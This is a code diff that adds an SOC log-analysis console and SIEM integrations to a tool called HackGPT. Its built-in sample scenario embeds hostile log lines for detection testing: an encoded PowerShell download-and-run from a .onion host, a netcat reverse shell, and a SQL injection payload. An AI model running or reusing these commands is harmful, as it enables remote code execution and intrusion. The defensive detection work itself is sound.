@@ -81,7 +81,11 @@ pandas = safe_import('pandas')
 try:
     from database import get_db_manager, PentestSession, Vulnerability, User, AuditLog
     from ai_engine import get_advanced_ai_engine
-    from security import EnterpriseAuth, ComplianceFrameworkMapper
+    from security import (
+        EnterpriseAuth, ComplianceFrameworkMapper, get_soc_analyzer,
+        SIEMConnectorManager, SplunkConnector, QRadarConnector,
+        ElasticsearchConnector, WebhookConnector, SIEMConnectorType
+    )
     from exploitation import AdvancedExploitationEngine, ZeroDayDetector
     from reporting import DynamicReportGenerator, get_realtime_dashboard
     from cloud import DockerManager, KubernetesManager, ServiceRegistry
@@ -213,6 +217,8 @@ class EnterpriseHackGPT:
         self.processor = None
         self.compliance = None
         self.db = None
+        self.soc_analyzer = None
+        self.siem_manager = None
         
         try:
             # Database
@@ -296,6 +302,17 @@ class EnterpriseHackGPT:
             else:
                 self.report_generator = BasicReportGenerator()
                 self.console.print("[yellow]⚠[/yellow] Using basic report generator")
+            
+            # SOC Analysis Engine
+            if MODULES_AVAILABLE:
+                self.soc_analyzer = get_soc_analyzer()
+                self.siem_manager = SIEMConnectorManager()
+                self.console.print("[green]✓[/green] Advanced SOC Analysis Engine initialized")
+                self.console.print("[green]✓[/green] SIEM Integration Connector Manager initialized")
+            else:
+                self.soc_analyzer = None
+                self.siem_manager = None
+                self.console.print("[yellow]⚠[/yellow] Advanced SOC Analysis Engine not available")
             
         except Exception as e:
             self.logger.error(f"Error initializing components: {e}")
@@ -408,7 +425,8 @@ class EnterpriseHackGPT:
             ("Parallel Processing", "✓ Available" if self.processor else "⚠ Sequential", f"{config.MAX_WORKERS} workers"),
             ("Cloud Services", "✓ Ready" if self.docker_manager else "⚠ Not Available", "Docker+K8s"),
             ("Compliance", "✓ Integrated" if self.compliance else "⚠ Manual", "OWASP+NIST"),
-            ("Real-time Dashboard", "✓ Active" if self.realtime_dashboard else "⚠ Disabled", "WebSocket")
+            ("Real-time Dashboard", "✓ Active" if self.realtime_dashboard else "⚠ Disabled", "WebSocket"),
+            ("SOC Analysis", "✓ Active" if self.soc_analyzer else "⚠ Disabled", "ATT&CK+Rules")
         ]
         
         for name, status, version in components:
@@ -439,6 +457,7 @@ class EnterpriseHackGPT:
             ("13", "API", "Start API Server"),
             ("14", "Voice", "Voice Command Mode"),
             ("15", "Web", "Launch Web Dashboard"),
+            ("16", "SOC", "Advanced SOC Analysis"),
             ("0", "System", "Exit Application")
         ]
         
@@ -809,6 +828,445 @@ class EnterpriseHackGPT:
         self.console.print("[cyan]Starting HackGPT Web Dashboard on http://0.0.0.0:8080[/cyan]")
         self.web_dashboard.run()
     
+    def run_soc_analysis(self):
+        """Advanced SOC Analysis Interactive Console"""
+        if not self.soc_analyzer:
+            self.console.print("[red]SOC Analysis Engine is not initialized.[/red]")
+            return
+
+        self.console.print(Panel("[bold cyan]Advanced Security Operations Center (SOC) Analysis Engine[/bold cyan]\n"
+                                 "Perform log parsing, IOC extraction, MITRE ATT&CK mapping, alert correlation, "
+                                 "statistical anomaly detection, and incident response playbook generation."))
+
+        soc_menu = Table(title="SOC Analysis Console Options")
+        soc_menu.add_column("Option", style="cyan")
+        soc_menu.add_column("Description", style="white")
+
+        soc_options = [
+            ("1", "Analyze Logs from a File"),
+            ("2", "Analyze Raw Logs (Pasted Text)"),
+            ("3", "Analyze Built-in Attack Scenario (Sample Logs)"),
+            ("4", "List Loaded Detection Rules"),
+            ("5", "Configure SIEM Connections (Splunk, QRadar, etc.)"),
+            ("6", "Fetch and Analyze Logs from Configured SIEM"),
+            ("0", "Return to Main Menu")
+        ]
+
+        for option, desc in soc_options:
+            soc_menu.add_row(option, desc)
+
+        self.console.print(soc_menu)
+        choice = Prompt.ask("[cyan]Select SOC option[/cyan]", choices=[o[0] for o in soc_options])
+
+        raw_logs = ""
+        if choice == "0":
+            return
+        elif choice == "5":
+            self.configure_siem_connections()
+            return
+        elif choice == "6":
+            self.fetch_and_analyze_siem_logs()
+            return
+        elif choice == "1":
+            filepath = Prompt.ask("[cyan]Enter path to log file[/cyan]")
+            if not os.path.exists(filepath):
+                self.console.print(f"[red]File not found: {filepath}[/red]")
+                return
+            try:
+                with open(filepath, 'r') as f:
+                    raw_logs = f.read()
+            except Exception as e:
+                self.console.print(f"[red]Error reading file: {e}[/red]")
+                return
+        elif choice == "2":
+            self.console.print("[cyan]Paste your raw logs below (press Enter then Ctrl-D or Ctrl-Z to finish):[/cyan]")
+            lines = []
+            try:
+                while True:
+                    line = input()
+                    lines.append(line)
+            except EOFError:
+                pass
+            raw_logs = "\n".join(lines)
+            if not raw_logs.strip():
+                self.console.print("[yellow]No logs provided.[/yellow]")
+                return
+        elif choice == "3":
+            # Generate sample logs containing multiple threats (Brute Force, SQL Injection, Port Scan, Reverse Shell, ransomware)
+            now = datetime.utcnow()
+            raw_logs = f"""
+{(now - timedelta(minutes=10)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user admin from 198.51.100.42 port 54321 ssh2
+{(now - timedelta(minutes=9)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user admin from 198.51.100.42 port 54322 ssh2
+{(now - timedelta(minutes=8)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user root from 198.51.100.42 port 54323 ssh2
+{(now - timedelta(minutes=7)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user support from 198.51.100.42 port 54324 ssh2
+{(now - timedelta(minutes=6)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user dbadmin from 198.51.100.42 port 54325 ssh2
+{(now - timedelta(minutes=5)).strftime('%b %d %H:%M:%S')} firewall-core ACCEPT SRC=198.51.100.42 DST=10.0.0.5 SPT=54320 DPT=80 PROTO=TCP
+{(now - timedelta(minutes=5)).strftime('%b %d %H:%M:%S')} web-server apache2[8822]: 198.51.100.42 - - "POST /api/v1/products HTTP/1.1" 500 1204 "{{\"id\": \"1' UNION SELECT 1,username,password_hash FROM users --\"}}"
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1234 DPT=21 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1235 DPT=22 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1236 DPT=23 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1237 DPT=25 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1238 DPT=80 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1239 DPT=443 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1240 DPT=3389 PROTO=TCP
+{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1241 DPT=8080 PROTO=TCP
+{(now - timedelta(minutes=3)).strftime('%b %d %H:%M:%S')} web-server systemd[1]: Created scheduled task to run command: powershell.exe -enc aWV4IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZGFjdG9yLm9uaW9uL3BheWxvYWQucHMnKQ==
+{(now - timedelta(minutes=2)).strftime('%b %d %H:%M:%S')} local-agent auditd[5544]: Process execution: nc -e /bin/bash 198.51.100.42 4444
+{(now - timedelta(minutes=1)).strftime('%b %d %H:%M:%S')} db-server systemd[1]: Warning: detected high directory change rate. files renamed to .locked. ransom note dropped at /var/lib/mysql/README_DECRYPT.txt
+"""
+            self.console.print("[green]Loaded built-in attack scenario logs.[/green]")
+        elif choice == "4":
+            self.console.print(Panel("[bold cyan]Loaded SOC Correlation Rules[/bold cyan]"))
+            rule_table = Table(show_header=True)
+            rule_table.add_column("Rule Name", style="cyan")
+            rule_table.add_column("Severity", style="magenta")
+            rule_table.add_column("Category", style="yellow")
+            rule_table.add_column("MITRE ID", style="blue")
+            
+            for rule in self.soc_analyzer.correlation_engine.DETECTION_RULES:
+                rule_table.add_row(
+                    rule['name'],
+                    rule['severity'].value.upper(),
+                    rule['category'],
+                    rule['mitre_id']
+                )
+            self.console.print(rule_table)
+            return
+
+        # Perform analysis
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            console=self.console
+        ) as progress:
+            task = progress.add_task("[cyan]Running SOC Analysis Engine...", total=100)
+            progress.update(task, advance=20)
+            report = self.soc_analyzer.analyze(raw_logs)
+            progress.update(task, completed=100)
+
+        # Print Executive Summary
+        self.console.print(Panel(report.executive_summary, title="[bold red]Executive Summary[/bold red]"))
+
+        # Risk Score Gauge
+        risk_color = "red" if report.risk_score >= 7.0 else "yellow" if report.risk_score >= 4.0 else "green"
+        self.console.print(f"[bold]Overall Security Risk Score: [/bold][bold {risk_color}]{report.risk_score:.1f}/10.0[/bold {risk_color}]\n")
+
+        # Stats Table
+        stats_table = Table(title="SOC Metric Summary")
+        stats_table.add_column("Metric", style="cyan")
+        stats_table.add_column("Value", style="yellow")
+        
+        stats_table.add_row("Total Logs Ingested & Normalized", str(report.total_logs_processed))
+        stats_table.add_row("Correlated Security Alerts", str(report.total_alerts))
+        stats_table.add_row("   - Critical Alerts", f"[red]{report.critical_alerts}[/red]")
+        stats_table.add_row("   - High Alerts", f"[orange3]{report.high_alerts}[/orange3]")
+        stats_table.add_row("   - Medium Alerts", f"[yellow]{report.medium_alerts}[/yellow]")
+        stats_table.add_row("   - Low / Info Alerts", str(report.low_alerts))
+        stats_table.add_row("Extracted Indicators of Compromise (IOCs)", str(report.iocs_extracted))
+        stats_table.add_row("Statistical Anomalies Flagged", str(report.anomalies_detected))
+        stats_table.add_row("MITRE ATT&CK Techniques Identified", str(report.mitre_techniques_identified))
+        
+        self.console.print(stats_table)
+
+        # Correlated Alerts
+        if report.alerts:
+            self.console.print("\n[bold orange3]🚨 Correlated Security Alerts[/bold orange3]")
+            alert_table = Table(show_header=True)
+            alert_table.add_column("ID", style="dim")
+            alert_table.add_column("Alert Title", style="bold red")
+            alert_table.add_column("Severity", style="magenta")
+            alert_table.add_column("Category", style="yellow")
+            alert_table.add_column("MITRE ATT&CK Mapping", style="blue")
+            alert_table.add_column("Score", style="green")
+
+            for alert in report.alerts:
+                mitre_str = ", ".join(f"{m.technique_id} ({m.technique})" for m in alert.mitre_mappings) if alert.mitre_mappings else "N/A"
+                alert_table.add_row(
+                    alert.alert_id,
+                    alert.title,
+                    alert.severity.value.upper(),
+                    alert.category,
+                    mitre_str,
+                    f"{alert.score:.1f}"
+                )
+            self.console.print(alert_table)
+
+        # Extracted IOCs
+        if report.iocs:
+            self.console.print("\n[bold yellow]🔍 Extracted Indicators of Compromise (IOCs)[/bold yellow]")
+            ioc_table = Table(show_header=True)
+            ioc_table.add_column("Type", style="cyan")
+            ioc_table.add_column("Value", style="bold white")
+            ioc_table.add_column("Confidence", style="green")
+            ioc_table.add_column("Threat Score", style="red")
+            ioc_table.add_column("Context", style="dim")
+
+            for ioc in report.iocs:
+                ioc_table.add_row(
+                    ioc.ioc_type,
+                    ioc.value,
+                    f"{ioc.confidence:.1%}",
+                    f"{ioc.threat_score:.1f}",
+                    ioc.context[:60] + "..." if len(ioc.context) > 60 else ioc.context
+                )
+            self.console.print(ioc_table)
+
+        # Anomalies
+        if report.anomalies:
+            self.console.print("\n[bold magenta]📈 Statistical Anomalies Detected[/bold magenta]")
+            anomaly_table = Table(show_header=True)
+            anomaly_table.add_column("Metric Name", style="cyan")
+            anomaly_table.add_column("Detected Value", style="yellow")
+            anomaly_table.add_column("Baseline Mean", style="dim")
+            anomaly_table.add_column("Z-Score", style="magenta")
+            anomaly_table.add_column("Description", style="white")
+
+            for anomaly in report.anomalies:
+                anomaly_table.add_row(
+                    anomaly.metric_name,
+                    f"{anomaly.current_value:.3f}",
+                    f"{anomaly.baseline_mean:.3f}",
+                    f"{anomaly.z_score:.2f}",
+                    anomaly.description
+                )
+            self.console.print(anomaly_table)
+
+        # Timeline Reconstruction
+        if report.timeline:
+            self.console.print("\n[bold cyan]📅 Incident Kill-Chain Timeline Reconstruction[/bold cyan]")
+            timeline_table = Table(show_header=True)
+            timeline_table.add_column("Timestamp", style="cyan")
+            timeline_table.add_column("Event Type", style="magenta")
+            timeline_table.add_column("Description", style="white")
+            timeline_table.add_column("Tactic/Technique", style="blue")
+
+            for entry in report.timeline:
+                tactic_str = f"{entry.mitre_tactic} ({entry.mitre_technique})" if entry.mitre_tactic else "N/A"
+                timeline_table.add_row(
+                    entry.timestamp.strftime('%Y-%m-%d %H:%M:%S') if entry.timestamp else "N/A",
+                    entry.event_type,
+                    entry.description,
+                    tactic_str
+                )
+            self.console.print(timeline_table)
+
+        # Playbooks
+        if report.playbooks:
+            self.console.print("\n[bold green]🛠️ Recommended Incident Response Playbooks[/bold green]")
+            for p in report.playbooks:
+                playbook_panel_content = (
+                    f"[bold]Incident Type:[/bold] {p.incident_type}  |  [bold]Estimated Time:[/bold] {p.estimated_time_minutes} min\n"
+                    f"[bold]Description:[/bold] {p.description}\n\n"
+                    f"[bold]Step-by-step Response Procedures:[/bold]\n"
+                )
+                for step in p.steps:
+                    playbook_panel_content += f"  [bold]{step['step']}. {step['action']}[/bold] (by {step['responsible']}) - {step['time_est']}m\n     {step['details']}\n"
+                
+                self.console.print(Panel(playbook_panel_content.strip(), title=f"[bold green]Playbook: {p.title}[/bold green]"))
+
+        # Option to save report
+        save_report = Confirm.ask("\n[cyan]Would you like to export this SOC analysis report to a JSON file?[/cyan]")
+        if save_report:
+            default_filename = f"soc_report_{report.report_id}.json"
+            filename = Prompt.ask("[cyan]Enter report filename[/cyan]", default=default_filename)
+            try:
+                report_dict = self.soc_analyzer.to_dict(report)
+                with open(filename, 'w') as f:
+                    json.dump(report_dict, f, indent=4)
+                self.console.print(f"[green]✓ SOC analysis report saved successfully to {filename}[/green]")
+            except Exception as e:
+                self.console.print(f"[red]✗ Failed to export report: {e}[/red]")
+
+        # Forward alerts to configured SIEMs if available
+        if self.siem_manager and self.siem_manager.connectors and report.alerts:
+            forward_siem = Confirm.ask("\n[cyan]Would you like to forward these correlated alerts to all configured SIEM systems?[/cyan]", default=True)
+            if forward_siem:
+                self.console.print("[cyan]Forwarding alerts to configured SIEM systems...[/cyan]")
+                for alert in report.alerts:
+                    results = self.siem_manager.forward_alert_to_all(alert)
+                    for cid, (success, msg) in results.items():
+                        if success:
+                            self.console.print(f"[green]✓ [SIEM: {cid}] Successfully forwarded alert: {alert.title}[/green]")
+                        else:
+                            self.console.print(f"[red]✗ [SIEM: {cid}] Forwarding failed: {msg}[/red]")
+
+    def configure_siem_connections(self):
+        """SIEM Configuration Menu"""
+        while True:
+            self.console.print(Panel("[bold cyan]Configure External SIEM Connections[/bold cyan]\n"
+                                     "Connect HackGPT SOC to Splunk, QRadar, Elasticsearch, or Generic Webhooks."))
+
+            siem_menu = Table(title="Registered Connections & Actions")
+            siem_menu.add_column("Connection ID", style="cyan")
+            siem_menu.add_column("SIEM Type", style="yellow")
+            siem_menu.add_column("Endpoint URL", style="white")
+            siem_menu.add_column("Status", style="green")
+
+            if self.siem_manager and self.siem_manager.connectors:
+                for cid, conn in self.siem_manager.connectors.items():
+                    status = "✓ Ready" if conn.url else "⚠ Unconfigured"
+                    stype = "Splunk" if isinstance(conn, SplunkConnector) else \
+                            "QRadar" if isinstance(conn, QRadarConnector) else \
+                            "Elasticsearch" if isinstance(conn, ElasticsearchConnector) else \
+                            "Generic Webhook"
+                    siem_menu.add_row(cid, stype, conn.url, status)
+            else:
+                siem_menu.add_row("N/A", "No active connections", "-", "-")
+
+            self.console.print(siem_menu)
+
+            self.console.print("[cyan]Actions:[/cyan]")
+            self.console.print("  [bold]1[/bold]. Register Splunk Integration")
+            self.console.print("  [bold]2[/bold]. Register IBM QRadar Integration")
+            self.console.print("  [bold]3[/bold]. Register Elasticsearch Integration")
+            self.console.print("  [bold]4[/bold]. Register Webhook Endpoint (Slack/Teams/SOAR)")
+            self.console.print("  [bold]5[/bold]. Test All Connections")
+            self.console.print("  [bold]0[/bold]. Return to SOC Menu")
+
+            choice = Prompt.ask("[cyan]Select action[/cyan]", choices=["0", "1", "2", "3", "4", "5"])
+
+            if choice == "0":
+                break
+            elif choice in ("1", "2", "3", "4"):
+                stype_map = {"1": "splunk", "2": "qradar", "3": "elasticsearch", "4": "generic_webhook"}
+                stype_name = {"1": "Splunk", "2": "QRadar", "3": "Elasticsearch", "4": "Webhook"}
+                
+                cid = Prompt.ask(f"[cyan]Enter unique Connection ID[/cyan]", default=stype_map[choice])
+                url = Prompt.ask(f"[cyan]Enter {stype_name[choice]} Endpoint URL[/cyan]", 
+                                 default="https://localhost:8089" if choice == "1" else 
+                                         "https://localhost:443" if choice == "2" else
+                                         "http://localhost:9200" if choice == "3" else
+                                         "https://hooks.slack.com/services/...")
+                
+                token = Prompt.ask(f"[cyan]Enter API Key / Token / HEC Token[/cyan]", password=True, default="mock_token")
+                verify_ssl = Confirm.ask("[cyan]Verify SSL Certificates?[/cyan]", default=False)
+                is_mock = Confirm.ask("[cyan]Run in Simulation Mode (Offline tests)?[/cyan]", default=True)
+
+                if choice == "1":
+                    conn = SplunkConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
+                elif choice == "2":
+                    conn = QRadarConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
+                elif choice == "3":
+                    conn = ElasticsearchConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
+                else:
+                    conn = WebhookConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
+
+                self.siem_manager.register_connector(cid, conn)
+                self.console.print(f"[green]✓ Connection '{cid}' registered successfully.[/green]")
+
+            elif choice == "5":
+                if not self.siem_manager or not self.siem_manager.connectors:
+                    self.console.print("[yellow]No SIEM connectors configured.[/yellow]")
+                    continue
+                
+                self.console.print("[cyan]Testing all registered connections...[/cyan]")
+                results = self.siem_manager.test_all()
+                for cid, (success, msg) in results.items():
+                    color = "green" if success else "red"
+                    symbol = "✓" if success else "✗"
+                    self.console.print(f"[{color}]{symbol} [Connection: {cid}] {msg}[/{color}]")
+
+    def fetch_and_analyze_siem_logs(self):
+        """Fetch logs from configured SIEM and analyze them"""
+        if not self.siem_manager or not self.siem_manager.connectors:
+            self.console.print("[yellow]Please configure a SIEM connector first (SOC Option 5).[/yellow]")
+            return
+
+        self.console.print(Panel("[bold cyan]Fetch and Analyze SIEM Logs[/bold cyan]\n"
+                                 "Select an active SIEM integration to pull logs and run correlation."))
+
+        connectors = list(self.siem_manager.connectors.keys())
+        choice = Prompt.ask("[cyan]Select active connection[/cyan]", choices=connectors)
+        conn = self.siem_manager.get_connector(choice)
+
+        default_query = "error OR fail OR ssh"
+        if isinstance(conn, SplunkConnector):
+            default_query = "index=security sourcetype=syslog failed"
+        elif isinstance(conn, QRadarConnector):
+            default_query = "SELECT UTF8(payload) FROM events WHERE payload CONTAINS 'failed' LIMIT 50"
+        elif isinstance(conn, ElasticsearchConnector):
+            default_query = "message:failed"
+
+        query = Prompt.ask(f"[cyan]Enter query (AQL/DSL/Search string)[/cyan]", default=default_query)
+        limit = Prompt.ask("[cyan]Enter maximum log lines to retrieve[/cyan]", default="50")
+        try:
+            limit = int(limit)
+        except ValueError:
+            limit = 50
+
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            console=self.console
+        ) as progress:
+            task = progress.add_task(f"[cyan]Querying {conn.name} SIEM...", total=100)
+            success, logs, msg = conn.fetch_logs(query, limit)
+            progress.update(task, completed=100)
+
+        if not success:
+            self.console.print(f"[red]✗ Failed to retrieve logs: {msg}[/red]")
+            return
+
+        self.console.print(f"[green]✓ Retrieved {len(logs)} log lines from SIEM: {msg}[/green]")
+        raw_logs = "\n".join(logs)
+        
+        # Run full analysis pipeline
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            console=self.console
+        ) as progress:
+            task = progress.add_task("[cyan]Running SOC Analysis on retrieved logs...", total=100)
+            report = self.soc_analyzer.analyze(raw_logs)
+            progress.update(task, completed=100)
+
+        # Print Executive Summary
+        self.console.print(Panel(report.executive_summary, title="[bold red]Executive Summary[/bold red]"))
+        
+        # Risk Score Gauge
+        risk_color = "red" if report.risk_score >= 7.0 else "yellow" if report.risk_score >= 4.0 else "green"
+        self.console.print(f"[bold]Overall Security Risk Score: [/bold][bold {risk_color}]{report.risk_score:.1f}/10.0[/bold {risk_color}]\n")
+
+        # Stats Table
+        stats_table = Table(title="SOC Metric Summary")
+        stats_table.add_column("Metric", style="cyan")
+        stats_table.add_column("Value", style="yellow")
+        stats_table.add_row("Total Logs Processed", str(report.total_logs_processed))
+        stats_table.add_row("Correlated Security Alerts", str(report.total_alerts))
+        stats_table.add_row("Extracted IOCs", str(report.iocs_extracted))
+        stats_table.add_row("Anomalies Flagged", str(report.anomalies_detected))
+        self.console.print(stats_table)
+
+        # Correlated Alerts
+        if report.alerts:
+            self.console.print("\n[bold orange3]🚨 Correlated Security Alerts[/bold orange3]")
+            alert_table = Table(show_header=True)
+            alert_table.add_column("Alert Title", style="bold red")
+            alert_table.add_column("Severity", style="magenta")
+            alert_table.add_column("Category", style="yellow")
+            alert_table.add_column("Score", style="green")
+
+            for alert in report.alerts:
+                alert_table.add_row(
+                    alert.title,
+                    alert.severity.value.upper(),
+                    alert.category,
+                    f"{alert.score:.1f}"
+                )
+            self.console.print(alert_table)
+
+            # Option to forward alerts back to SIEM
+            forward_siem = Confirm.ask("\n[cyan]Would you like to forward these correlated alerts back to SIEM?[/cyan]", default=True)
+            if forward_siem:
+                self.console.print("[cyan]Forwarding alerts back to SIEM receivers...[/cyan]")
+                for alert in report.alerts:
+                    results = self.siem_manager.forward_alert_to_all(alert)
+                    for cid, (success, msg) in results.items():
+                        if success:
+                            self.console.print(f"[green]✓ [SIEM: {cid}] Successfully forwarded: {alert.title}[/green]")
+                        else:
+                            self.console.print(f"[red]✗ [SIEM: {cid}] Failed: {msg}[/red]")
+
     def run(self):
         """Main application loop"""
         self.show_banner()
@@ -817,7 +1275,7 @@ class EnterpriseHackGPT:
             try:
                 self.show_main_menu()
                 choice = Prompt.ask("[cyan]Select option[/cyan]", 
-                                  choices=[str(i) for i in range(16)])
+                                  choices=[str(i) for i in range(17)])
                 
                 if choice == "0":
                     self.console.print("[green]Shutting down HackGPT Enterprise...[/green]")
@@ -853,6 +1311,8 @@ class EnterpriseHackGPT:
                     self.voice_command_mode()
                 elif choice == "15":
                     self.launch_web_dashboard()
+                elif choice == "16":
+                    self.run_soc_analysis()
                     
             except KeyboardInterrupt:
                 self.console.print("\n[yellow]Use option 0 to exit properly[/yellow]")
